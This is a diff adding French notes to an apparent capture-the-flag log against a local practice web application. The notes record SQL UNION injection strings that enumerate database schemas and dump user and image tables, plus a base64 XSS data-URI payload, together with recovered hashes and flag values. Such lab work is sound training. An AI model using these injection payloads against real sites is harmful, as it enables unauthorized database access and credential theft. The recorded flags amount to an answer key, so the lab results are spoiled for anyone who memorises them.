@@ -150,3 +150,37 @@ http://192.168.56.101/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgn
 
 BIM le flag :
 `928D819FC19405AE09921A2B71227BD9ABA106F9D2D37AC412E9E5A750F1506D`
+
+
+
+
+
+# 17 Janvier 
+
+retour de vacance du skie 
+
+0 UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata--
+
+https://learn.microsoft.com/fr-fr/sql/relational-databases/system-information-schema-views/columns-transact-sql?view=sql-server-ver16
+
+0 UNION ALL SELECT NULL,concat(TABLE_NAME) FROM information_schema.columns-- 
+
+
+http://192.168.56.101/?page=searchimg&id=0+UNION++select+table_name%2C+column_name+FROM+information_schema.columns&Submit=Submit#
+
+ 0 UNION  select table_name, column_name FROM information_schema.columns 
+
+
+
+ ID: 0 UNION select Commentaire, countersign FROM users 
+First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
+Surname : 5ff9d0165b4f92b14994e5c685cdce28
+```10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5```
+
+http://192.168.56.101/?page=searchimg&id=0+UNION+select+url%2C+comment+FROM+list_images&Submit=Submit#
+
+ID: 0 UNION select title, comment FROM list_images  
+Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
+Url : Hack me ?
+
+ ```f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188```
